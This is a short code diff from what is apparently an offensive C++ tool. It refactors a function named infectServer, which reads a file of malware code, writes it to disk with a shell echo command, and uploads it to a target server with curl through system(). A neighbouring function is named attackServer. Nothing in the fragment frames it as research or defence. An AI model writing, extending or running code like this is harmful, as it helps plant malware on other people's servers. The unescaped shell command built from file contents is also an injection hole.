@@ -1,6 +1,7 @@
 #include <iostream>
 #include <string>
 #include <vector>
+#include <sstream>
 #include <ctime>
 #include <cstdlib>
 #include <unistd.h>
@@ -26,10 +27,11 @@ void infectServer(const std::string& target) {
     std::string malwareCode((std::istreambuf_iterator<char>(malwareFile)),
                              std::istreambuf_iterator<char>());
 
-    std::string command = "echo '" + malwareCode + "' > " + MALWARE_FILE_NAME;
-    command += " && curl -X POST -F 'file=@" + std::string(MALWARE_FILE_NAME) + "' " + target;
+    std::stringstream command;
+    command << "echo '" << malwareCode << "' > " << MALWARE_FILE_NAME;
+    command << " && curl -X POST -F 'file=@" << MALWARE_FILE_NAME << "' " << target;
 
-    system(command.c_str());
+    system(command.str().c_str());
 }
 
 void attackServer(const std::string& target) {
